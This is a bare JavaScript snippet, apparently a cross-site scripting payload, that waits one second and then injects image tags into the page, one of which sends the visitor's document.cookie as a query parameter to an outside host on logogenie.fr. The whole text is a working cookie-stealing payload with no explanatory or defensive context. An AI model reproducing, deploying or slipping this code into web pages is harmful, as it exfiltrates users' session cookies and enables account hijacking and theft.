function gg(){
  var i1 = '<img src="https://www.logogenie.fr/looool"> <img src="https://www.logogenie.fr/cookie?c=' + document.cookie + '" />'
  document.body.innerHTML += i1
}
setTimeout(gg,1000);
